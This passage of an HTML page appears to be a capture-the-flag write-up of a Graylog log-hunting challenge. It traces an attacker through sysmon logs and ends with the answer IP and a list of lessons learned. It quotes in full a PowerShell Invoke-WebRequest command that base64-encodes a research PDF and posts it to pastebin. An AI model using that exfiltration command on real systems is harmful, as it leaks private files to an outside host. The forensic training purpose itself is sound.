+<div class="codehilite"><pre><span></span>super_secret_elfu_research.pdf
+</pre></div>
+<img alt="chl10-22" src="../images/chl10/22.png" /></p>
+<p>The attacker used <code>Invoke-WebRequest</code> cmdlet to post the file to  a remote URL of <a href="https://pastebin.com/post.php">https://pastebin.com/post.php</a>.</p>
+<div class="codehilite"><pre><span></span><span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">SysWOW64</span><span class="p">\</span><span class="n">WindowsPowerShell</span><span class="p">\</span><span class="n">v1</span><span class="p">.</span><span class="n">0</span><span class="p">\</span><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">pastebin</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">post</span><span class="p">.</span><span class="n">php</span> <span class="n">-Method</span> <span class="n">POST</span> <span class="n">-Body</span> <span class="p">@{</span> <span class="s2">&quot;submit_hidden&quot;</span> <span class="p">=</span> <span class="s2">&quot;submit_hidden&quot;</span><span class="p">;</span> <span class="s2">&quot;paste_code&quot;</span> <span class="p">=</span> <span class="p">$(</span><span class="no">[Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="no">[IO.File]</span><span class="p">::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="s2">&quot;C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf&quot;</span><span class="p">)));</span> <span class="s2">&quot;paste_format&quot;</span> <span class="p">=</span> <span class="s2">&quot;1&quot;</span><span class="p">;</span> <span class="s2">&quot;paste_expire_date&quot;</span> <span class="p">=</span> <span class="s2">&quot;N&quot;</span><span class="p">;</span> <span class="s2">&quot;paste_private&quot;</span> <span class="p">=</span> <span class="s2">&quot;0&quot;</span><span class="p">;</span> <span class="s2">&quot;paste_name&quot;</span><span class="p">=</span><span class="s2">&quot;cookie recipe&quot;</span> <span class="p">}</span>
+</pre></div>
+
+<p>We can pivot off of this information to look for a sysmon network connection id of 3 with a source of <code>elfu-res-wks2</code> and DestinationHostname of <code>pastebin.com</code>.
+<div class="codehilite"><pre><span></span>DestinationHostname:pastebin.com AND EventID:3 AND source:elfu\-res\-wks2
+</pre></div>
+<img alt="chl10-23" src="../images/chl10/23.png" /></p>
+<div class="admonition done">
+<p class="admonition-title">The answer</p>
+<p><code>104.22.3.84</code></p>
+</div>
+<hr />
+<p><img alt="chl10-24" src="../images/chl10/24.png" /></p>
+<div class="admonition success">
+<p class="admonition-title">You have completed the Graylog challenge! 🎉</p>
+</div>
+<hr />
+<h3 id="what-youve-learned">🎓 What you've learned<a class="headerlink" href="#what-youve-learned" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Searching through logs using Graylog.</li>
+<li>Sysmon event id</li>
+<li>Logon types</li>
+<li>Tracing malicious Files and attacks locally and over network</li>
+<li>WebEx vulnerability</li>
+</ul>
+<div class="footnote">
+<hr />
+<ol>
+<li id="fn:19">
+<p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon">https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon</a>
+  <a href="https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4624">https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4624</a>
+  <a href="http://techgenix.com/logon-types/">http://techgenix.com/logon-types/</a>&#160;<a class="footnote-backref" href="#fnref:19" title="Jump back to footnote 1 in the text">&#8617;</a></p>
+</li>
+<li id="fn:20">
+<p><a href="https://blog.skullsecurity.org/2018/technical-rundown-of-webexec">https://blog.skullsecurity.org/2018/technical-rundown-of-webexec</a>
+   <a href="https://srcincite.io/blog/2018/12/03/webexec-reloaded-cisco-webex-meetings-desktop-app-lpe.html">https://srcincite.io/blog/2018/12/03/webexec-reloaded-cisco-webex-meetings-desktop-app-lpe.html</a>
+   <a href="https://www.bleepingcomputer.com/news/security/unusual-remote-execution-bug-in-cisco-webex-discovered-by-researchers/">https://www.bleepingcomputer.com/news/security/unusual-remote-execution-bug-in-cisco-webex-discovered-by-researchers/</a>&#160;<a class="footnote-backref" href="#fnref:20" title="Jump back to footnote 2 in the text">&#8617;</a></p>
+</li>
+</ol>
+</div>
+                
+                  
+                
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../challenge9/" title="Key Bitting" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                Key Bitting
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../challenge11/" title="Smart Braces" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Next
+                </span>
+                Smart Braces
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            Copyright &copy; 2019 Santa NP
+          </div>
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+  <div class="md-footer-social">
+    <link rel="stylesheet" href="../../assets/fonts/font-awesome.css">
+    
+      <a href="https://twitter.com/salaheldinaz" class="md-footer-social__link fa fa-twitter"></a>
+    
+      <a href="https://salaheldin.online" class="md-footer-social__link fa fa-ra"></a>
+    
+  </div>
+
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/application.808e90bb.js"></script>
+      
+      <script>app.initialize({version:"1.0.4",url:{base:"../.."}})</script>
+      
+        <script src="../../javascripts/asciinema-player.js"></script>
+      
+    
+  </body>
+</html>
